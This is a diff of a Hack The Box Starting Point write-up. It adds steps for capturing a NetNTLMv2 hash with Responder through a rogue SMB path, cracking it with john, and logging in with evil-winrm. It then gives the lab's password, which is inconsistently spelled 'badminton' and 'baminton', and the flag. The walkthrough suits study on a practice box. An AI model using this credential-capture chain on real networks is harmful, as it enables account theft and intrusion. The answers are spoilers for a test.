@@ -386,16 +386,35 @@ Which flag do we use in the Responder utility to specify the network interface?
 
     A: -I
 
-Use: `ip a` to see the interface connect to Starting point
+
+* Here at this point i encoutered some error regarding ports when running responder on wsl so i switch to kali
+
+Use: `ifconfig` to see the interface connect to Starting point
 
 <div align="center">
   <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_2.png?raw=true" alt="image">
 </div>
 
-My interface is `eth0`
+My interface is `tun0`
+
+Using responder run this cmd `responder -I {interface to startingpoint}
 
 
-Using responder run this cmd `responder -i {target ip} -I {interface to startingpoint} -d -w
+<div align="center">
+  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_7_2b.png?raw=true" alt="image">
+</div>
+
+<div align="center">
+  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_7_2a.png?raw=true" alt="image">
+</div>
+
+When listen to SMB respond, change the `//10.10.14.6/somefile` in the suggesstions to  `//{responder ip}/somefile`
+
+When we get the hash response , save to .txt file to prepare to run it through `john`
+
+<div align="center">
+  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_7_3.png?raw=true" alt="image">
+</div>
 
 ### Task 8
 
@@ -407,16 +426,61 @@ There are several tools that take a NetNTLMv2 challenge/response and try million
 
     A: john the ripper
 
+
+Using: `john --wordlist={your word list or rockyou.txt} {responder hash}` to find the password
+
+<div align="center">
+  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_8_2.png?raw=true" alt="image">
+</div>
+
+We found the admin password is `badminton`
+
 ### Task 9
 
 What is the password for the administrator user?
 
+
+    A: baminton
+
 ### Task 10
 
 We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?
+
+Now we using `evil-winrm` to coonnect to target machine :
+
+<div align="center">
+  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_10.png?raw=true" alt="image">
+</div>
+
+Traversing through the directories...
+
+<div align="center">
+  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_10_2.png?raw=true" alt="image">
+</div>
+
+We found nothing until hit the `Users` directory we see some user named `mike` , cd'd to it
+We found the flag.txt, `cat` it
+
+<div align="center">
+  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_f.png?raw=true" alt="image">
+</div>
 
 ### Submit Flag
 
 Submit root flag
 
 #### Flag
+
+    ea81b7afddd03efaa0945333ed147fac
+
+---
+
+<div align="center">
+  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_e.png?raw=true" alt="image">
+</div>
+
+---
+
+---
+
+
